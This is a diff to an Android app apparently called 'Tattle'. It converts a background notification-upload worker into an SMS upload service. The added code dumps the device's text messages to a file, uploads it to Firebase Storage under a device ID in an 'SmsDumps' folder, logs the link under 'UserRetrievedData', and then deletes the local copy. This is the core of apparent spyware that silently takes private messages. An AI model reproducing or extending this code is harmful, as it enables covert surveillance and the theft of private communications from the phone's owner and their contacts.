@@ -10,6 +10,7 @@ import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
+import com.globalsolutions.Tattle.OtherUtils.SmsHelper;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.firebase.auth.FirebaseAuth;
@@ -21,18 +22,17 @@ import com.google.firebase.storage.UploadTask;
 
 import java.io.File;
 
-public class NotificationUploadScheduler extends Worker {
-
-    public static final String TAG = "BROADDD";
-
+public class SmsUploadService extends Worker {
+    public static final String TAG = "SMSUPLOADSERVICE";
     FirebaseAuth firebaseAuth;
     FirebaseDatabase firebaseDatabase;
     DatabaseReference databaseReference;
     StorageReference storageReference;
+    SmsHelper smsHelper;
     Context context;
     SharedPrefs sharedPrefs;
 
-    public NotificationUploadScheduler(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+    public SmsUploadService(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
         this.context = context;
     }
@@ -44,18 +44,24 @@ public class NotificationUploadScheduler extends Worker {
         firebaseDatabase = FirebaseDatabase.getInstance();
         databaseReference = firebaseDatabase.getReference();
         sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
-        storageReference = FirebaseStorage.getInstance().getReference(sharedPrefs.getUniqueId());
-        getFileToUpload();
+
+        smsHelper = new SmsHelper(context);
+
+        smsHelper.dumpSMS();
+            storageReference = FirebaseStorage.getInstance().getReference();
+            getFileToUpload();
         Data outputData = new Data.Builder().putBoolean("fileUploaded", true).build();
         return Result.success(outputData);
     }
 
     public void getFileToUpload() {
-        String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Temp";
-        final File backupDBFolder = new File(backupDBPath);
-        backupDBFolder.mkdirs();
+        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
+                .mkdirs();
+        File dir = Environment
+                .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+        File logFile = new File(dir, "backup.txt");
 
-        File logFile = new File(backupDBFolder, "temp.txt");
+//        File logFile = new File(backupDBFolder, "temp.txt");
         if (logFile.exists()) {
             uploadFile(logFile);
         } else {
@@ -64,7 +70,7 @@ public class NotificationUploadScheduler extends Worker {
 
     private void uploadFile(File file) {
 
-        StorageReference mStorageReference = this.storageReference.child("NotificationLogs").child(file.getName());
+        StorageReference mStorageReference = this.storageReference.child(sharedPrefs.getUniqueId()).child("SmsDumps").child(System.currentTimeMillis() + "." + "txt");
         Uri uri = Uri.fromFile(file);
         mStorageReference.putFile(uri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
             @Override
@@ -72,7 +78,7 @@ public class NotificationUploadScheduler extends Worker {
                 mStorageReference.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                     @Override
                     public void onSuccess(Uri uri) {
-                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("NotificationLogs").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
+                        databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("SmsDump").push().setValue(uri.toString()).addOnSuccessListener(new OnSuccessListener<Void>() {
                             @Override
                             public void onSuccess(Void aVoid) {
                                 deleteFile();
@@ -97,11 +103,11 @@ public class NotificationUploadScheduler extends Worker {
     }
 
     public void deleteFile() {
-        String backupDBPath = Environment.getExternalStorageDirectory().getPath() + "/Temp";
-        final File backupDBFolder = new File(backupDBPath);
-        backupDBFolder.mkdirs();
-
-        File logFile = new File(backupDBFolder, "temp.txt");
+        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
+                .mkdirs();
+        File dir = Environment
+                .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+        File logFile = new File(dir, "backup.txt");
         if (logFile.exists()) {
             try {
                 logFile.delete();
@@ -110,6 +116,5 @@ public class NotificationUploadScheduler extends Worker {
         } else {
         }
     }
-
 
 }
